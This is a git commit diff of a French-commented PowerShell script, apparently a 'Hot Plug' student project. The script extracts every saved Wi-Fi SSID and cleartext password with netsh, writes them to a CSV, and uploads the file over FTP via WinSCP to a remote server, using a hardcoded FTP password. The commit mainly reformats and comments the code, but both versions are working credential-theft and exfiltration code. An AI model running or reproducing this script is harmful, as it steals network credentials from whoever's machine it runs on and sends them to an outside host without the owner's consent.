af556480034c336dc003367de72945e3bc2c0afd
branavanj <104469463+branavanj@users.noreply.github.com>
2024-02-19 11:43:34 +0100

    Update wifi_connect.ps1

--- wifi_connect.ps1
+++ wifi_connect.ps1
@@ -1,33 +1,31 @@
-Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
-$wifi=@()
-#Visualisation des réseaux bloqués
-$cmd0=netsh wlan show blockednetworks
-#Liste des SSID
-$cmd1=netsh wlan show profiles
-ForEach($row1 in $cmd1)
-{
-    #Récupération des ssids par expression régulière
-    If($row1 -match 'Profil Tous les utilisateurs[^:]+:.(.+)$')
-    {
-        $ssid=$Matches[1]
-        $cmd2=netsh wlan show profiles $ssid key=clear
-        ForEach($row2 in $cmd2)
-        {
-            #Récupération des clés par expression régulière
-            If($row2 -match 'Contenu de la c[^:]+:.(.+)$')
-            {
-                $key=$Matches[1]
-                #Stockage des ssids et des clés dans un tableau
-                $wifi+=[PSCustomObject]@{ssid=$ssid;key=$key}
+$wifi = @()
+
+# Visualisation des réseaux bloqués
+$cmd0 = netsh wlan show blockednetworks
+
+# Liste des SSID
+$cmd1 = netsh wlan show profiles
+ForEach ($row1 in $cmd1) {
+    # Récupération des SSID par expression régulière
+    If ($row1 -match 'Profil Tous les utilisateurs[^:]+:.(.+)') {
+        $ssid = $Matches[1]
+        $cmd2 = netsh wlan show profiles $ssid key=clear
+        ForEach ($row2 in $cmd2) {
+            # Récupération des clés par expression régulière
+            If ($row2 -match 'Contenu de la c[^:]+:.(.+)') {
+                $key = $Matches[1]
+                # Stockage des SSID et des clés dans un tableau
+                $wifi += [PSCustomObject]@{ssid = $ssid; key = $key}
             }
         }
     }
 }
 
-$wifi | Export-CSV -Path "$env:USERPROFILE\Documents\Hot Plug\Script\output.csv" -NoTypeInformation
+# Exporter les résultats au format CSV
+$csvPath = "$env:USERPROFILE\Documents\Hot Plug\Script\output.csv"
+$wifi | Export-CSV -Path $csvPath -NoTypeInformation
 
-
-
+# Importer le module WinSCP
 Import-Module WinSCP
 
 # Paramètres FTP
@@ -37,9 +35,6 @@ $ftpPassword = "9559"
 
 # Chemin distant sur le serveur FTP
 $remoteCsvFilePath = "/home/branavan/Fichier.csv"
-
-# Chemin local du fichier CSV à envoyer
-$localCsvFilePath = "$env:USERPROFILE\Documents\cours\Hot Plug\Script\output.csv"
 
 # Créer la session WinSCP
 $sessionOptions = New-Object WinSCP.SessionOptions -Property @{
@@ -52,14 +47,16 @@ $sessionOptions = New-Object WinSCP.SessionOptions -Property @{
 $session = New-Object WinSCP.Session
 
 try {
- 
+    # Ouvrir la session WinSCP
     $session.Open($sessionOptions)
 
-   
+    # Options de transfert
     $transferOptions = New-Object WinSCP.TransferOptions
-    $transferResult = $session.PutFiles($localCsvFilePath, $remoteCsvFilePath, $False, $transferOptions)
 
-    
+    # Transférer le fichier CSV
+    $transferResult = $session.PutFiles($csvPath, $remoteCsvFilePath, $False, $transferOptions)
+
+    # Vérifier le résultat du transfert
     if ($transferResult.IsSuccess) {
         Write-Host "Transfert réussi!"
     } else {
@@ -69,5 +66,6 @@ try {
         }
     }
 } finally {
+    # Fermer la session WinSCP
     $session.Dispose()
 }
